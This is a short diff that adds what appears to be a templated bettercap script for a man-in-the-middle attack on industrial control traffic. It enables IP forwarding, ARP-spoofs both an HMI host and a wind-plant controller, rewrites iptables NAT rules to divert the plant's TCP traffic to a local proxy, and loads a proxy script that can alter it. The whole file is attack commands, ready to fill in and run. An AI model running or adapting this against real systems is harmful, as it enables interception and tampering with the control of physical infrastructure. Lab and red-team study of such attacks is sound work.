@@ -1,0 +1,18 @@
+!echo 1 > /proc/sys/net/ipv4/ip_forward
+net.probe on
+sleep 3
+net.show
+set arp.spoof.targets {{ hmi_ip }},{{ windplant_ip }}
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+arp.spoof on
+!iptables -t nat -F
+!iptables -t nat -A PREROUTING -p tcp --dport {{ tcp_port }} -d {{ windplant_ip }} -j REDIRECT --to-port {{ proxy_port }}
+!iptables -t nat -A PREROUTING -p tcp --sport {{ tcp_port }} -s {{ windplant_ip }} -j REDIRECT --to-port {{ proxy_port }}
+set tcp.address {{ windplant_ip }}
+set tcp.port {{ tcp_port }}
+set tcp.proxy.address 0.0.0.0
+set tcp.proxy.port {{ proxy_port }}
+set tcp.proxy.script {{ proxy_script }}
+tcp.proxy on
+active
